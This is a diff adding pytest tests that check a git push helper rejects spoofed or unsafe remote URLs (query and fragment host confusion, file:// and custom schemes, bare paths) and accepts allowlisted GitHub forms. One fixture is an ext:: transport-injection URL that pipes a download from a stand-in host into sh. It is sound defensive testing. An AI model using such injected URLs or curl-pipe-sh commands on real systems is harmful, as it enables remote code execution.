@@ -259,6 +259,348 @@ def test_push_expected_repo_userinfo_confusion_host_refused() -> None:
     assert not any("fetch" in a for a in calls)
 
 
+def test_push_expected_repo_query_confusion_host_refused() -> None:
+    """Query-confusion URL (evil.com?@github.com/...) must resolve to evil.com."""
+    calls: list[list[str]] = []
+
+    def runner(argv: list[str]) -> Completed:
+        calls.append(list(argv))
+        _assert_git_c(argv)
+        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
+            return Completed(0, "feat-x\n", "")
+        if "--porcelain" in argv:
+            return Completed(0, "", "")
+        if "@{upstream}" in argv and "rev-list" not in argv:
+            return Completed(0, "origin/feat-x\n", "")
+        cfg = _config(argv)
+        if cfg is not None:
+            return cfg
+        rem = _remote(argv)
+        if rem is not None:
+            return rem
+        url = _remote_push_url(argv, url="https://evil.com?@github.com/org/app.git")
+        if url is not None:
+            return url
+        if "push" in argv or "fetch" in argv:
+            raise AssertionError("must not fetch/push when expected_repo mismatches")
+        raise AssertionError(f"unexpected argv: {argv}")
+
+    with pytest.raises(GitActError, match="does not match expected repo"):
+        push_branch(cwd=CWD, runner=runner, expected_repo="org/app")
+    assert not any("push" in a for a in calls)
+    assert not any("fetch" in a for a in calls)
+
+
+def test_push_expected_repo_fragment_confusion_host_refused() -> None:
+    """Fragment-confusion URL (evil.com#@github.com/...) must resolve to evil.com."""
+    calls: list[list[str]] = []
+
+    def runner(argv: list[str]) -> Completed:
+        calls.append(list(argv))
+        _assert_git_c(argv)
+        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
+            return Completed(0, "feat-x\n", "")
+        if "--porcelain" in argv:
+            return Completed(0, "", "")
+        if "@{upstream}" in argv and "rev-list" not in argv:
+            return Completed(0, "origin/feat-x\n", "")
+        cfg = _config(argv)
+        if cfg is not None:
+            return cfg
+        rem = _remote(argv)
+        if rem is not None:
+            return rem
+        url = _remote_push_url(argv, url="https://evil.com#@github.com/org/app.git")
+        if url is not None:
+            return url
+        if "push" in argv or "fetch" in argv:
+            raise AssertionError("must not fetch/push when expected_repo mismatches")
+        raise AssertionError(f"unexpected argv: {argv}")
+
+    with pytest.raises(GitActError, match="does not match expected repo"):
+        push_branch(cwd=CWD, runner=runner, expected_repo="org/app")
+    assert not any("push" in a for a in calls)
+    assert not any("fetch" in a for a in calls)
+
+
+def test_push_expected_repo_bare_url_no_host_refused() -> None:
+    """Schemeless bare org/repo push URL must not skip the host pin."""
+    calls: list[list[str]] = []
+
+    def runner(argv: list[str]) -> Completed:
+        calls.append(list(argv))
+        _assert_git_c(argv)
+        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
+            return Completed(0, "feat-x\n", "")
+        if "--porcelain" in argv:
+            return Completed(0, "", "")
+        if "@{upstream}" in argv and "rev-list" not in argv:
+            return Completed(0, "origin/feat-x\n", "")
+        cfg = _config(argv)
+        if cfg is not None:
+            return cfg
+        rem = _remote(argv)
+        if rem is not None:
+            return rem
+        url = _remote_push_url(argv, url="org/app")
+        if url is not None:
+            return url
+        if "push" in argv or "fetch" in argv:
+            raise AssertionError("must not fetch/push when expected_repo mismatches")
+        raise AssertionError(f"unexpected argv: {argv}")
+
+    with pytest.raises(GitActError, match="does not match expected repo"):
+        push_branch(cwd=CWD, runner=runner, expected_repo="org/app")
+    assert not any("push" in a for a in calls)
+    assert not any("fetch" in a for a in calls)
+
+
+def test_push_expected_repo_ext_transport_injection_refused() -> None:
+    """ext:: git-remote transport injection must not pass the URL allowlist."""
+    calls: list[list[str]] = []
+
+    def runner(argv: list[str]) -> Completed:
+        calls.append(list(argv))
+        _assert_git_c(argv)
+        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
+            return Completed(0, "feat-x\n", "")
+        if "--porcelain" in argv:
+            return Completed(0, "", "")
+        if "@{upstream}" in argv and "rev-list" not in argv:
+            return Completed(0, "origin/feat-x\n", "")
+        cfg = _config(argv)
+        if cfg is not None:
+            return cfg
+        rem = _remote(argv)
+        if rem is not None:
+            return rem
+        url = _remote_push_url(
+            argv, url="ext::sh -c 'curl evil.example | sh' git@github.com:org/app"
+        )
+        if url is not None:
+            return url
+        if "push" in argv or "fetch" in argv:
+            raise AssertionError("must not fetch/push when expected_repo mismatches")
+        raise AssertionError(f"unexpected argv: {argv}")
+
+    with pytest.raises(GitActError, match="does not match expected repo"):
+        push_branch(cwd=CWD, runner=runner, expected_repo="org/app")
+    assert not any("push" in a for a in calls)
+    assert not any("fetch" in a for a in calls)
+
+
+def test_push_expected_repo_file_scheme_refused() -> None:
+    """file:// is not an allowlisted scheme even when the path looks like github.com."""
+    calls: list[list[str]] = []
+
+    def runner(argv: list[str]) -> Completed:
+        calls.append(list(argv))
+        _assert_git_c(argv)
+        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
+            return Completed(0, "feat-x\n", "")
+        if "--porcelain" in argv:
+            return Completed(0, "", "")
+        if "@{upstream}" in argv and "rev-list" not in argv:
+            return Completed(0, "origin/feat-x\n", "")
+        cfg = _config(argv)
+        if cfg is not None:
+            return cfg
+        rem = _remote(argv)
+        if rem is not None:
+            return rem
+        url = _remote_push_url(argv, url="file://github.com/org/app.git")
+        if url is not None:
+            return url
+        if "push" in argv or "fetch" in argv:
+            raise AssertionError("must not fetch/push when expected_repo mismatches")
+        raise AssertionError(f"unexpected argv: {argv}")
+
+    with pytest.raises(GitActError, match="does not match expected repo"):
+        push_branch(cwd=CWD, runner=runner, expected_repo="org/app")
+    assert not any("push" in a for a in calls)
+    assert not any("fetch" in a for a in calls)
+
+
+def test_push_expected_repo_custom_scheme_refused() -> None:
+    """Custom git-remote-<transport> schemes are outside the three allowlisted forms."""
+    calls: list[list[str]] = []
+
+    def runner(argv: list[str]) -> Completed:
+        calls.append(list(argv))
+        _assert_git_c(argv)
+        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
+            return Completed(0, "feat-x\n", "")
+        if "--porcelain" in argv:
+            return Completed(0, "", "")
+        if "@{upstream}" in argv and "rev-list" not in argv:
+            return Completed(0, "origin/feat-x\n", "")
+        cfg = _config(argv)
+        if cfg is not None:
+            return cfg
+        rem = _remote(argv)
+        if rem is not None:
+            return rem
+        url = _remote_push_url(argv, url="custom://github.com/org/app.git")
+        if url is not None:
+            return url
+        if "push" in argv or "fetch" in argv:
+            raise AssertionError("must not fetch/push when expected_repo mismatches")
+        raise AssertionError(f"unexpected argv: {argv}")
+
+    with pytest.raises(GitActError, match="does not match expected repo"):
+        push_branch(cwd=CWD, runner=runner, expected_repo="org/app")
+    assert not any("push" in a for a in calls)
+    assert not any("fetch" in a for a in calls)
+
+
+def test_push_expected_repo_https_without_git_suffix_succeeds() -> None:
+    """HTTPS push URL without trailing .git is an allowlisted form."""
+    calls: list[list[str]] = []
+
+    def runner(argv: list[str]) -> Completed:
+        calls.append(list(argv))
+        _assert_git_c(argv)
+        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
+            return Completed(0, "feat-x\n", "")
+        if "--porcelain" in argv:
+            return Completed(0, "", "")
+        if "@{upstream}" in argv and "rev-list" not in argv:
+            return Completed(0, "origin/feat-x\n", "")
+        cfg = _config(argv)
+        if cfg is not None:
+            return cfg
+        rem = _remote(argv)
+        if rem is not None:
+            return rem
+        url = _remote_push_url(argv, url="https://github.com/org/app")
+        if url is not None:
+            return url
+        if "fetch" in argv:
+            return Completed(0, "", "")
+        if "rev-list" in argv:
+            return Completed(0, "0\t1\n", "")
+        if argv == PUSH_ARGV:
+            return Completed(0, "", "")
+        if argv == ["git", "-C", CWD, "rev-parse", "HEAD"]:
+            return Completed(0, SHA + "\n", "")
+        raise AssertionError(f"unexpected argv: {argv}")
+
+    got = push_branch(cwd=CWD, runner=runner, expected_repo="org/app")
+    assert got == SHA
+    assert PUSH_ARGV in calls
+
+
+def test_push_expected_repo_scp_with_git_suffix_succeeds() -> None:
+    """SCP-style push URL WITH trailing .git is an allowlisted form."""
+    calls: list[list[str]] = []
+
+    def runner(argv: list[str]) -> Completed:
+        calls.append(list(argv))
+        _assert_git_c(argv)
+        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
+            return Completed(0, "feat-x\n", "")
+        if "--porcelain" in argv:
+            return Completed(0, "", "")
+        if "@{upstream}" in argv and "rev-list" not in argv:
+            return Completed(0, "origin/feat-x\n", "")
+        cfg = _config(argv)
+        if cfg is not None:
+            return cfg
+        rem = _remote(argv)
+        if rem is not None:
+            return rem
+        url = _remote_push_url(argv, url="git@github.com:org/app.git")
+        if url is not None:
+            return url
+        if "fetch" in argv:
+            return Completed(0, "", "")
+        if "rev-list" in argv:
+            return Completed(0, "0\t1\n", "")
+        if argv == PUSH_ARGV:
+            return Completed(0, "", "")
+        if argv == ["git", "-C", CWD, "rev-parse", "HEAD"]:
+            return Completed(0, SHA + "\n", "")
+        raise AssertionError(f"unexpected argv: {argv}")
+
+    got = push_branch(cwd=CWD, runner=runner, expected_repo="org/app")
+    assert got == SHA
+    assert PUSH_ARGV in calls
+
+
+def test_push_expected_repo_scp_without_git_suffix_succeeds() -> None:
+    """SCP-style push URL without trailing .git is an allowlisted form."""
+    calls: list[list[str]] = []
+
+    def runner(argv: list[str]) -> Completed:
+        calls.append(list(argv))
+        _assert_git_c(argv)
+        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
+            return Completed(0, "feat-x\n", "")
+        if "--porcelain" in argv:
+            return Completed(0, "", "")
+        if "@{upstream}" in argv and "rev-list" not in argv:
+            return Completed(0, "origin/feat-x\n", "")
+        cfg = _config(argv)
+        if cfg is not None:
+            return cfg
+        rem = _remote(argv)
+        if rem is not None:
+            return rem
+        url = _remote_push_url(argv, url="git@github.com:org/app")
+        if url is not None:
+            return url
+        if "fetch" in argv:
+            return Completed(0, "", "")
+        if "rev-list" in argv:
+            return Completed(0, "0\t1\n", "")
+        if argv == PUSH_ARGV:
+            return Completed(0, "", "")
+        if argv == ["git", "-C", CWD, "rev-parse", "HEAD"]:
+            return Completed(0, SHA + "\n", "")
+        raise AssertionError(f"unexpected argv: {argv}")
+
+    got = push_branch(cwd=CWD, runner=runner, expected_repo="org/app")
+    assert got == SHA
+    assert PUSH_ARGV in calls
+
+
+def test_push_expected_repo_ssh_url_form_succeeds() -> None:
+    """ssh://git@github.com/... push URL is an allowlisted form."""
+    calls: list[list[str]] = []
+
+    def runner(argv: list[str]) -> Completed:
+        calls.append(list(argv))
+        _assert_git_c(argv)
+        if "rev-parse" in argv and "--abbrev-ref" in argv and "HEAD" in argv:
+            return Completed(0, "feat-x\n", "")
+        if "--porcelain" in argv:
+            return Completed(0, "", "")
+        if "@{upstream}" in argv and "rev-list" not in argv:
+            return Completed(0, "origin/feat-x\n", "")
+        cfg = _config(argv)
+        if cfg is not None:
+            return cfg
+        rem = _remote(argv)
+        if rem is not None:
+            return rem
+        url = _remote_push_url(argv, url="ssh://git@github.com/org/app.git")
+        if url is not None:
+            return url
+        if "fetch" in argv:
+            return Completed(0, "", "")
+        if "rev-list" in argv:
+            return Completed(0, "0\t1\n", "")
+        if argv == PUSH_ARGV:
+            return Completed(0, "", "")
+        if argv == ["git", "-C", CWD, "rev-parse", "HEAD"]:
+            return Completed(0, SHA + "\n", "")
+        raise AssertionError(f"unexpected argv: {argv}")
+
+    got = push_branch(cwd=CWD, runner=runner, expected_repo="org/app")
+    assert got == SHA
+    assert PUSH_ARGV in calls
+
+
 def test_push_ahead_zero_skips_push() -> None:
     calls: list[list[str]] = []
 
